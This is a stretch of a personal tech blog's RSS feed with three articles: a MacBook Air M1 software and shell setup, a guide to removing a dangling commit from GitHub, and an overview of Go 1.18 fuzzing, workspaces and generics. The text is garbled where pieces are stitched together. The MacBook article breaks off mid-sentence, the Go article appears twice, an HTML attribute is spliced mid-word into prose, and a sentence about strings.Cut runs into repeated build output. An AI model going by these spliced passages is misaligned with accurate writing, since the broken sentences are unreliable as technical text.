  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.">
  
  <title>My MacBook Air M1 setup</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>Preface</h1>
<p>It was in the very early nineties when I first used a computer.  It must have been the 286 of my neighbor or the Amiga of my cousin.  A couple of years later, I think when I was in 4th grade, I got my first own computer.  A 486DX2-66 with 8 megs of RAM and a horribly slow 1GB SCSI hard drive, connected through an Adaptec ISA SCSI Controller card.  Not only was the hard drive slow as hell, maybe 1 MB/s at tops, it was also very noisy.  Annoyingly loud to be honest, like if it wrote every bit with a chisel into stone.  This machine ran MS-DOS and so I learned how to remove unnecessary drivers from <code>autoexec.bat</code>, like the mouse driver, in order to free up a couple kilobytes of RAM so that I can play DOOM or whatever.</p>
<p>Anyways, couple years later I got my first Windows PC, an AMD k6-2 with 333MHz that was equipped with the famous IBM Deskstar hard drive.  This hard disk was even noisier as my old SCSI drive while also being very unreliable, hence they were also known as IBM Deathstar.  Of course you can imagine how funny it was to ship the broken drive to IBM's service center somewhere in Great Britain, waiting for it to be returned so that I have a working PC again.  It took them over a month, or longer, to return the drive which meant that I had no computer in the meantime.  Actually, I didn't even know if they had received the drive or if it got lost in the english channel.  You just had to wait patiently in the good ol' days.  Unimaginable in today's world, people would get mad if they didn't receive an update every couple of hours.  Somehow people still knew how to be patient back then, and so was I, which meant that I had to spent my time with other things.  Internet was still something new and the time you were online could be counted in minutes a day.  This is probably one of the reasons for people being patient.  Having no smartphone meant that the ordinary folk still had an attention spans longer than a fart lasts, which means they could read a book or watch a movie without being distracted.  Hell, they even managed to meet each other to talk and have some beers (I do miss that since COVID).</p>
<p>Sorry, I was drifting away, thing is, I wanted to tell that I was a Windows user until I began to study computer science in 2010.  I slowly moved over to Linux then and used it ever since, which means I am a <del>penguin</del> Linux user for more than 9 years now<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.  However, I always missed my favorite audio software in Linux, even though it got better in recent years with Wine, <a href="https://github.com/robbert-vdh/yabridge">yabridge</a>, <a href="https://www.bitwig.com/">Bitwig</a>, and <a href="https://pipewire.org/">pipewire</a>.  Still, it isn't a lot of fun because there is so much configuration involved.  But not only that, every so often something breaks and after ten minutes fixing whatever has failed you give up and do something else, which is not music making.</p>
<p>For quite some time now I've been arguing with myself if I can justify to get a Mac and be done with it.  Some years ago this would have been a serious financial decision but now I earn enough so that I can just buy one if I want one.  This is a privilege and I'm well aware of that.  But trust me, I still know way to well what it means to have almost no spare money.</p>
<p>Maybe it's only me but computers should just work.  I happily pay the additional price if it means that I don't have to deal with bug trackers in my rare free time.  The mac solves exactly that for me.  It just works and I have (almost) the best of both worlds, all my favorite audio software as well as all the developer tools I need.  Except that docker sucks really big on Apple, but that's okay for me.  With the introduction of Apple silicon there is also less reason to keep on x86.  The M1 chips are the biggest performance impact since SSDs entered the home computer market.  I received an M1 MacBook Pro from my employee, the 2020 model not the M1 Pro, and the machine is great and almost as fast as my Ryzen 3700x desktop.  Of course, the touch bar is garbage and I understand why they ditched it with the new models.  Eventually I decided to buy myself a present and get the better and slightly cheaper alternative to the 2020 MacBook Pro, the fan-less MacBook Air.  This thing is fast, battery life feels endless it is always dead silent.  The fan in the Pro model is also off almost all of the time, but knowing that there isn't even fan inside is just mind blowing, regarding how noisy laptops commonly are.  For now I can just say that I 💚 this thing.</p>
<h1>My MacBook Air M1 Setup</h1>
<p>Here's the list of things I installed on the MacBook Air:</p>
<p>First thing I did was to install Firefox with two extensions <a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">multi-account containers</a> and <a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search">ublock origin</a> of course.  It should be prohibited to use a web browser without ad blocker.</p>
<p>Now it was time to get <a href="https://obsidian.md/">Obsidian</a> so that I can take notes.  As for most tools I just use the default configuration, except that I have activated the daily notes extension.  This extension allows to easily create a page from a template for each day, where my template looks like this:</p>
<pre><code class="language-md"># {{date}}

- placeholder

## Tasks

- [ ] a task
</code></pre>
<p>Another indispensable tool is <a href="https://keepassxc.org/">KeePassXC</a>.  Honestly, I don't know most of my passwords and I don't care to since KeePass does that for me.</p>
<p>Having a password manager installed meant that I can lookup my Apple password to sign in into my Apple account.  Otherwise I could not install anything from the app store.  The mac app store is the same garbage as all the other ones and I think they are a bad idea.</p>
<p>Let's go on with another Mozilla tool that I use daily and this is <a href="https://www.thunderbird.net/en-US/">Thunderbird</a>.  I could use Apple Mail but there is no way to only accept text mails with this fancy app, so I just stick with the ⚡️🕊.  Once in a while I send a GPG encrypted email, which is also a no go for Apples hipster mail client.</p>
<p>What really amazed me after years of Linux desktop usage was that CalDav (calendar) and CardDav (address book) is very well integrated into the system and it took me like 30s to connect it to my <a href="https://www.fastmail.com/">Fastmail</a> account.  The calendar app is fine by the way.</p>
<p>Despite being no flat-earther I do like <a href="https://telegram.org/">Telegram</a> for it's thin desktop client.  They still know how to build a cross platform app that doesn't require to load a browser in the background.</p>
<p>Don't worry my dear reader, I also use <a href="https://signal.org/">Signal</a>, one does not rule out the other.</p>
<p>Admittedly, window management is very primitive on macOS.  I have tried tiling window managers on Linux but I didn't like them too much, probably because they required days of configuration until they were usable.  I'm simple in that regards and just wanted to have something like Aero Snap on Windows, that is tiling windows by dragging them to a screen border.  For macOS there was an app called Hookshot that was recently renamed to <a href="https://rectangleapp.com/pro">Rectangle</a>.  I payed for Rectangle App but I only use windows snapping.  Renaming an app from something easy to google to a generic term like rectangle is a questionable decision to begin with, but if you have already installed Hookshot and want to upgrade to Rectangle I recommend to uninstall it and power cycle the machine.  This is no joke, window snapping still didn't work after a reboot but after I powered the laptop on and off.  Don't ask, I would like to know as well why this was necessary (I don't refer to the renaming here 😅).</p>
<p>Another thing which annoyed me on macOS is that you cannot switch between windows of the same app using <code>&lt;cmd&gt;+&lt;tab&gt;</code>.  Some expert had the fantastic idea to hide this functionality behind <code>&lt;cmd&gt;+~</code>, hope that whoever did that is happy now.  Gnome replicated the same idiotic behavior but at least you could configure it.  Well, there is a great open source app called <a href="https://alt-tab-macos.netlify.app">alt-tab</a> for macOS which binds by default to <code>&lt;option&gt;+&lt;tab&gt;</code> and provides a sensible application switcher.</p>
<p>Time to install a code editor.  My weapon of choice is <del>GNU Emacs</del> <a href="https://code.visualstudio.com/">VS Code</a>.  I try to keep the number of extensions minimal and use whatever is the default suggestion for a file type.  There is one additional setup to do on macOS that is to run <code>Shell Command: Install 'code' command in PATH</code> with <code>&lt;ctrl&gt;+P</code> so that I can start VS Code from within a terminal.</p>
<p><a href="https://go.dev/">Go</a> go go!</p>
<p>It breaks my heart but I also need to install <a href="https://www.jetbrains.com/idea/">JetBrains IDEA</a> in the community edition because there still is <a href="https://github.com/klingtnet/bitwig-extensions">a Java repository I need to work on</a>.</p>
<p>I am a <a href="https://www.ibm.com/plex/">IBM Plex</a> convert and now use <a href="https://www.jetbrains.com/lp/mono/">JetBrains Mono</a> as my monospace font of choice.</p>
<p><a href="https://www.spotify.com/de/">Spotify</a>, the billion dollar company that is unable to distinguish two artists with the same name.  The day I figure out how to properly handle ID3 tags with Go will be the day I cancel my Spotify subscription and remove their electron monstrosity.  Till then I will use their app and live with the limitation of 10k songs per playlist.  Oh, one additional thing, make sure to disable <em>Normalize Volume</em>, all it does is to make everything half as loud which is not what I understand of volume normalization but what do I know.</p>
<p>Once in a while I need to create or work with vector graphics and so I bought <a href="https://affinity.serif.com/en-us/designer/">Affinity Designer</a> while it was on x-mas sale two years ago.  I am by far no expert in this domain, but let me tell you, I would prefer this to Adobe Illustrator any time of the day.  Even without a discount, 55€ is more than fair for the software you get.  You could also buy a tube of <a href="https://www.supremenewyork.com/previews/fallwinter2020/accessories/supreme-colgate-toothpaste">Supreme Toothpaste</a> for that money, depends on if you already gave up or not.</p>
<p><a href="https://github.com/MonitorControl/MonitorControl/">MonitorControl</a> is another great piece of software.  Controlling the brightness of my external display like for the integrated one is a feature I always wanted.  For Linux there is an alternative called <a href="https://github.com/ddccontrol/ddccontrol">ddccontrol</a> but it's not as neatly integrated as MonitorControl is.</p>
<p><a href="https://rust-lang.org">Rust</a>, once my favorite programming language, is also something I use regularly, even though not as often as I should.  The language toolchain is best installed using <a href="https://rustup.rs/">rustup</a>.</p>
<p>VPN providers are often a bit shady, the one exception for me is <a href="https://mullvad.net/en/">Mullvad</a>.  They <a href="https://mullvad.net/de/blog/2017/7/13/mullvad-donates-wireguard/">support the development of Wireguard</a> and they their client is open source.  Also, they go a long way in trying to use as less data as possible from you.  What other service provider allows you to register without entering any personal information?  I know none.</p>
<h2>Shell Setup</h2>
<p>On Linux I used <a href="https://github.com/alacritty/alacritty/issues/4673">alacritty</a> as my terminal emulator of choice but they don't notarize their binaries for macOS, which I can understand somehow.  Luckily there is <a href="https://iterm2.com/">iterm2</a> which feels like a proper replacement.</p>
<p>I haven't adapted my <a href="https://github.com/klingtnet/dotfiles">dotfiles</a> repository yet and decided to start from scratch with this system.  My <code>.gitconfig</code> is rather simple:</p>
<pre><code class="language-ini">[pull]
	ff = only
[user]
	email = &lt;redacted&gt;
	name = Andreas Linz
	signingkey = &lt;redacted&gt;
[core]
	editor = vim

[alias]
	p = push
	co = checkout
	s = status
	c = commit
	a = add
	hash = rev-parse HEAD
	todos = ! git diff --name-only &quot;$1&quot; | xargs rg --no-heading --trim TODO
[init]
	defaultBranch = master

[url &quot;git@github.com:&quot;]
	  insteadOf = gh:
[commit]
	gpgsign = true
</code></pre>
<p>Coming from Linux the thing I miss most is a package manager, especially when you're used to something like <code>pacman</code> from Arch Linux.  The situation on macOS is not as bad as on Windows but at least we have <a href="https://brew.sh/">homebrew</a> and <a href="https://www.macports.org/">MacPorts</a>.  I went with homebrew because that's what everyone is using and despite its terminology where everything is named after thins in a brewery or bar.  Since GUI applications usually come with an auto updater I decided to only install CLI tools and libraries with <code>brew</code>.</p>
<p>With the URL rewrite from above's gitconfig I can easily clone repositories from GitHub by doing <code>git clone gh:org/repo</code>.  But there is <a href="https://github.com/cli/cli">GitHub CLI</a> that can do much more, like managing issues, pull requests or watch running actions.  That's the first tool I've installed using <code>brew</code>, not because I use it that often, just because it was the first tool that came to my mind.</p>
<p>Shameless plug, <a href="https://github.com/klingtnet/netdrop">netdrop</a> is a tool that proved to be helpful.  It allows me to send a pipe over my local network, or just a file.  Most of my config files were copied like that.</p>
<p>My shell setup is pretty simple since a while.  On Arch Linux is used plain bash with a minimal configuration and a custom <a href="https://github.com/klingtnet/dotfiles/tree/master/tools/rusty-prompt">Rust prompt renderer</a>.  The default shell on macOS is <code>zsh</code> so I went with that.  Instead of my own prompt renderer I now use <a href="https://starship.rs/">starship</a> which is pretty powerful out of the box and requires almost no configuration.  This is how my <code>~/.zshrc</code> looks like:</p>
<pre><code class="language-bash">HISTFILE=~/.zsh_history
HISTSIZE=999999999
SAVEHIST=$HISTSIZE

# setopt inc_append_history
setopt share_history
setopt hist_ignore_dups
setopt hist_ignore_space

alias ll='ls -alh'
alias cdtemp='cd $(mktemp -d)'

# autocompletion
# https://stackoverflow.com/a/58517668
autoload -Uz compinit &amp;&amp; compinit -u

# https://stackoverflow.com/a/12403798
bindkey &quot;^[[1;3C&quot; forward-word
bindkey &quot;^[[1;3D&quot; backward-word

# ... shell completions were omitted.

eval &quot;$(starship init zsh)&quot;
</code></pre>
<p>Before I switched to <a href="https://github.com/alacritty/alacritty/issues/4673">alacritty</a> I was using <a href="https://github.com/gnunn1/tilix">tilix</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> because it supported terminal splitting, tabs and so on.  The reason for using alacritty was that it us]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>How to delete unreachable commits on GitHub</title>
      <link>https://klingt.net/articles/how-to-delete-unreachable-commits-on-github.html</link>
      <description>GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.">
  
  <title>How to delete unreachable commits on GitHub</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>How to delete unreachable commits on GitHub</h1>
<p>The dangling<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> <a href="https://github.com/klingtnet/klingtnet.github.io/blob/b2444ca54c74a7c9dde6504cf028b6c0f4729d8f/content/resume.md#L3">commit</a> shown in the screenshot below should have never been on GitHub, at least not publicly visible.  The commit was part of a branch called <code>draft</code> that I pushed to the repository when it was still private.  If I am not mistaken then I removed the file, squashed and merged the <code>draft</code> branch into <code>master</code>, deleted the branch and then pushed it onto GitHub.  After making sure that branch <code>draft</code> was gone on GitHub I made the repository public.</p>
<p><img src="unreachable-commit.png" alt="unreachable commit"></p>
<p>As you can clearly see the commit is still there, and I only discovered this by accident when using GitHub's search.  So, the question is now how to delete this commit?  I cannot even reach the commit from my local repository:</p>
<pre><code class="language-shell">$ git show b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
fatal: bad object b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
</code></pre>
<p>Its parent commit is reachable though:</p>
<pre><code class="language-shell">$ git show 01aea0c8e1bdceb7869403814a4ebb87e25883b2
commit 01aea0c8e1bdceb7869403814a4ebb87e25883b2
Author: Andreas Linz &lt;klingt.net@gmail.com&gt;
Date:   Sun Jul 25 16:18:10 2021 +0200

    Initial commit
</code></pre>
<p>If the commit would still be part of my local repository I could have removed it with this call and subsequent <code>git push</code>.</p>
<pre><code class="language-shell">$ git reflog expire --expire-unreachable=all
</code></pre>
<p>But, nothing happens since the commit is not in my local repository.  What to do now 🤔?  As far as I see there is nothing I can do locally and cloning the repository will also omit the commit I want to delete.  GitHub must trigger the garbage collection for this repository so I <a href="https://support.github.com/ticket/">opened a ticket</a> with them.  What really amazed me was how fast they responded, after 10 minutes everything was done and that's for a free account!  Here's what they wrote in the response:</p>
<blockquote>
<p>As you mentioned, it does indeed appear to be an an unreferenced commit dangling in our cache. I went ahead and performed the garbage collection and cache clearance operations for the repository klingtnet/klingtnet.github.io. Attempting to access the commit directly now returns a 404.</p>
</blockquote>
<p>Luckily the commit contained no secrets, but what I learned from this lesson is that I need to double or triple check the contents of my repository before making it public on GitHub.  A simple deletion of a branch might not be sufficient.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Dangling, free-standing, unreachable or unreferenced, all terms fit here.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>Go 1.18 with some fuzzing and a focus on generics</title>
      <link>https://klingt.net/articles/go-1-18-with-some-fuzzing-and-a-focus-on-generics.html</link>
      <description>Go 1.18 is the biggest release since Go 1.0 came out.  In this article I will summarize most of the updates and additions and I will also give a more in-depth look into generics.  This article will also be the basis of the talk I will give at the #25 Golang Leipzig meetup.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Go 1.18 is the biggest release since Go 1.0 ]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>Go 1.18 with some fuzzing and a focus on generics</title>
      <link>https://klingt.net/articles/go-1-18-with-some-fuzzing-and-a-focus-on-generics.html</link>
      <description>Go 1.18 is the biggest release since Go 1.0 came out.  In this article I will summarize most of the updates and additions and I will also give a more in-depth look into generics.  This article will also be the basis of the talk I will give at the #25 Golang Leipzig meetup.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="Go 1.18 is the biggest release since Go 1.0 came out.  In this article I will summarize most of the updates and additions and I will also give a more in-depth look into generics.  This article will also be the basis of the talk I will give at the #25 Golang Leipzig meetup.">
  
  <title>Go 1.18 with some fuzzing and a focus on generics</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="scrajor features that got introduced to Go, those are:</p>
<ul>
<li>generics</li>
<li>and fuzz testing support.</li>
</ul>
<p>Before we go into more detail about the last two features, let's look at the general innovations first.</p>
<p>Regardless of Go 1.18 being a larger than normal release, it will be no exception of the rule, meaning the <a href="https://go.dev/doc/go1compat">compatibility promise</a> still holds and there will be no breaking changes.  This is what makes Go a viable choice for production code.</p>
<h2><code>debug/buildinfo</code></h2>
<p>Binaries compiled with the new version will automatically include version control information.  This data can be accessed at runtime through <code> runtime/debug.ReadBuildInfo</code> or by running <code>go version -m path/to/binary</code>.  A common workaround that is often used, and will be obsolete now, is to set version information on compile time using a <code>go build</code> flag like <code> -ldflags &quot;-X main.Version=$VERSION&quot;</code>.</p>
<pre><code class="language-shell">$ go1.18rc1 version -m hello
hello: go1.18rc1
        path    hello:
        mod     hello   (devel)
        build   -compiler=gc
        build   CGO_ENABLED=1
        build   CGO_CFLAGS=
        build   CGO_CPPFLAGS=
        build   CGO_CXXFLAGS=
        build   CGO_LDFLAGS=
        build   GOARCH=arm64
        build   GOOS=darwin
        build   vcs=git
        build   vcs.revision=9b40c4e23a9f695c5f2adb7886d7d45f3e395eb7
        build   vcs.time=2022-02-19T11:59:45Z
        build   vcs.modified=true
</code></pre>
<h2><code>net/netip</code></h2>
<p><a href="https://tailscale.com/blog/netaddr-new-ip-type-for-go/">Tailscales' custom IP address struct</a> landed in the standard library.  In contrast to <a href="https://pkg.go.dev/net#IPAddr"><code>net.IPAddr</code></a> this type is immutable, takes less memory and is comparable making it usable as a map key.  Brad Fitzpatrick did a talk about <a href="https://archive.fosdem.org/2021/schedule/event/gotailscale/">Go at Tailscale</a> in FOSDEM 2021 where he goes into the details why they needed a new IP type.</p>
<h2>Miscellaneous changes</h2>
<p>With <code>strings.Cut()</code> you can cut a string around the first instance of a separator, e.g. <code>strings.Cut(&quot;a,b,c&quot;, &quot;,&quot;)</code> will result in 6d7d45f3e395eb7
        build   vcs.time=2022-02-19T11:59:45Z
        build   vcs.modified=true
</code></pre>
<h2><code>net/netip</code></h2>
<p><a href="https://tailscale.com/blog/netaddr-new-ip-type-for-go/">Tailscales' custom IP address struct</a> landed in the standard library.  In contrast to <a href="https://pkg.go.dev/net#IPAddr"><code>net.IPAddr</code></a> this type is immutable, takes less memory and is comparable making it usable as a map key.  Brad Fitzpatrick did a talk about <a href="https://archive.fosdem.org/2021/schedule/event/gotailscale/">Go at Tailscale</a> in FOSDEM 2021 where he goes into the details why they needed a new IP type.</p>
<h2>Miscellaneous changes</h2>
<p>With <code>strings.Cut()</code> you can cut a string around the first instance of a separator, e.g. <code>strings.Cut(&quot;a,b,c&quot;, &quot;,&quot;)</code> will result in <code>&quot;a&quot;, &quot;b,c&quot;, true</code>, where the last argument indicates if the separator was found or not.  The <code>strings.Title()</code> function for making a string title-case is now deprecated because it doesn't handle unicode properly, use <a href="https://pkg.go.dev/golang.org/x/text/cases#Title"><code>x/test/cases.Title</code></a> instead.</p>
<p>Iteration in range pipelines of <code>html/template</code> or <code>text/template</code> templates can now be ended with <code>{{break}}</code> or the next iteration can be started immediately with <code>{{continue}}</code>.</p>
<p>Mutexes from <code>sync</code> now have non blocking <code>TryLock/TryRLock</code> methods that try to acquire the lock if it's not currently held.</p>
<blockquote>
<p>Note that while correct uses of TryLock do exist, they are rare, and use of TryLock is often a sign of a deeper problem in a particular use of mutexes.</p>
</blockquote>
<p>A small <a href="https://pkg.go.dev/net/http@master#MaxBytesHandler">MaxBytesHandler</a> middleware was added to the <code>http</code> package.  This middleware limits the amount of data read from a request body or written in a response.  Most Go HTTP routers and web frameworks already provide such a middleware, often to prevent denial-of-service attacks.</p>
<p>The <code>go vet</code> linting tool was updated to work with generic functions and types.  Did you know that <code>go vet</code> is automatically run when you <code>go test</code> your application?</p>
<p>Our beloved formatting tool <code>gofmt</code> now reads and formats source code files concurrently making it significantly faster.  To be honest, formatting speed was never an issue for any Go code base I worked with.</p>
<p>TLS 1.0 and TLS 1.1 are disabled by default now for <em>client</em> connections, the server side still allows TLS 1.0.</p>
<h2>Compiler</h2>
<p>Go now supports <a href="https://github.com/golang/go/wiki/MinimumRequirements#amd64">four microarchitecture levels</a> for the <code>amd64</code> target.  A specific level can be selected using the <code>GOAMD64=&lt;level&gt;</code> environment variable.  To compile a binary for a recent x86-64 CPU that supports AVX instructions run <code>GOAMD64=v3 GOARCH=amd64 go build my/application</code>.  A higher/newer microarchitecture version does not necessarily result in better performance, which means you need to benchmark.  The actual performance benefit should be negligible for most web servers.</p>
<!-- TODO: Use github.com/golang/benchmarks or a small tool that applies image transformations to benchmark architecture levels  -->
<p>In the <a href="https://tip.golang.org/doc/go1.17#compiler">previous release</a> the calling convention for functions on x86-64 targets switched from stack to register based, resulting in a minor speedup and slightly smaller binaries.  Support for register based calling convention is now expanded to arm64<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> and amd64 on all operating systems.</p>
<h2>Workspace Mode</h2>
<p>The <a href="https://go.googlesource.com/proposal/+/master/design/45713-workspace.md">module workspace proposal</a> was accepted and implemented.  Workspace mode is activated if the <code>go</code> tool finds a <code>go.work</code> file in the current directory or any of its parents.  A <code>go.work</code> file might look like this:</p>
<pre><code>go 1.18

use ../foo/bar
use ./baz

replace example.com/foo v1.2.3 =&gt; example.com/bar v1.4.5
</code></pre>
<p>Note that, as for any other <code>go.*</code> file, there is a subcommand that should be used to create or edit its contents.  In this case the command is <code>go work</code>.  In workspace mode you can easily use development versions of a library for many go modules, without having to write a <code>replace</code> directives in each of every <code>go.mod</code> files.  In the example above, that was copied from <code>go help work</code>, <code>./baz</code> could be a fork of <code>github.com/go-redis/redis</code> or any other dependency you need to modify locally.</p>
<h2>Fuzzing</h2>
<p>Regular unit tests use a fixed set of inputs to test a function, this often includes simple success cases and inputs that represent corner cases, e.g. the empty string, <code>nil</code> so on and so forth.</p>
<p>Fuzz testing, or fuzzing, on the other hand generates random inputs to test functions with the goal to trigger bugs.  You can imagine that the search space, from which random inputs are taken, gets  huge very quickly.  Hence, fuzz testing implementations often use techniques to reduce the search space, e.g. instrumenting your code or some form of heuristics like starting with extreme values of an input type, those could be <code>NaN</code>, <code>-/+inf</code> for a float type or invalid unicode strings.</p>
<p>Anyways, we don't have to care about the implementation details since the Go team did all the hard work of implementing a fuzzing framework for us and we can just use it.  A starting point to learn about fuzz testing in Go is the <a href="https://go.dev/doc/fuzz/">fuzzing landing page</a> that also links to the official tutorial.</p>
<pre><code class="language-go">// copied from https://pkg.go.dev/testing@master#hdr-Fuzzing
func FuzzHex(f *testing.F) {
  for _, seed := range [][]byte{{}, {0}, {9}, {0xa}, {0xf}, {1, 2, 3, 4}} {
    f.Add(seed)
  }
  f.Fuzz(func(t *testing.T, in []byte) {
    enc := hex.EncodeToString(in)
    out, err := hex.DecodeString(enc)
    if err != nil {
      t.Fatalf(&quot;%v: decode: %v&quot;, in, err)
    }
    if !bytes.Equal(in, out) {
      t.Fatalf(&quot;%v: not equal after round trip: %v&quot;, in, out)
    }
  })
}
</code></pre>
<p>Fuzz tests look very similar to regular unit tests but their name must start with <code>Fuzz</code>.  Inputs to the <em>seed corpus</em>, a set of default test inputs, are registered using <code>f.Add()</code>.  A fuzz test must have only one fuzz target, that is the function passed to <code>f.Fuzz()</code> which takes an instance of <code>*testing.T</code> as their first argument. All remaining arguments must be in same order and type as those added to the seed corpus with <code>f.Add()</code>.  To enable fuzzing pass the <code>-fuzz=FuzzMyTest</code> flag to <code>go test</code>.  If the flag was not specified fuzz tests are still run, but only with their fixed seed corpus as input.  Only a limited set of types is allowed as fuzz inputs, primitives, <code>string</code> and <code>[]byte</code> among others.</p>
<p>Since there is no control over the inputs of a fuzz tested function only properties of it can be tested.  Properties could be that the functions result is still a valid unicode string or that a number is in a certain range.</p>
<p>Be aware that fuzzing can create several gigabytes of data in the fuzz cache and might cause high load on the test machine.  I would therefore advise against enabling fuzz tests in a CI pipeline.</p>
<p>Should fuzzing detect a bug in your code, consider adding it to the <a href="https://github.com/golang/go/wiki/Fuzzing-trophy-case">trophy case</a>.</p>
<h2>Generics</h2>
<p>Generics might be the most controversial feature ever added to Go language.  Not having Generics was one of Go's &quot;features&quot; since they make a language certainly more complex.  It took multiple language change proposal until we landed with the <a href="https://go.googlesource.com/proposal/+/refs/heads/master/design/43651-type-parameters.md">type parameters proposal</a> that was eventually implemented with Go 1.18.  There was quite some buzz around that proposal and <a href="https://duckduckgo.com/?q=go+generics+blog&amp;t=h_&amp;ia=web">everyone and their mother wrote blog posts</a> about using generics with Go, <a href="go-generics-a-quick-overview.html">and so did I</a>.</p>
<p>Let's start with a definition:</p>
<blockquote>
<p>Generics allow you to write one, <em>generic</em>, function for a set of types without relying on reflection.  The compiler will then implement one version of your generic function for every concrete type it was instantiated with.</p>
</blockquote>
<p>This might sound intimidating to some, so here's an example:</p>
<pre><code class="language-go">func min[T int | uint | int64](x, y T) T {
	if x &lt;= y {
		return x
	}
	return y
}
</code></pre>
<p>What's different from a normal Go function is that there is a <em>type parameter</em> list in square brackets <code>[T int | uint | int64]</code> before the function arguments.  Here we can define the set of types the function is allowed to be instantiated with.  Thanks to Go's type inference we don't have to explicitly write out the type when calling the function, instead we can just do <code>min(1, -5)</code> and the compiler will be smart enough to infer the type for us.</p>
<p>One last minute change to the release was that the <a href="https://github.com/golang/exp/tree/6cf2b201936e0673ace5b31d2dffa00dafb3ee58/constraints">constraints package</a> was moved out of the standard library.  This package predefined a set of common interfaces, e.g. one for signed or unsigned integer numbers.  This brings us to the next point, that is we don't need to define the set of allowed types inline, instead we can define them in an interface like:</p>
<pre><code class="language-go">type Signed interface {
	~int | ~int8 | ~int16 | ~int32 | ~int64
}
</code></pre>
<p>and then define our <code>min</code> function as</p>
<pre><code class="language-go">func min[T Signed](x, y T) T {
	if x &lt;= y {
		return x
	}
	return y
}
</code></pre>
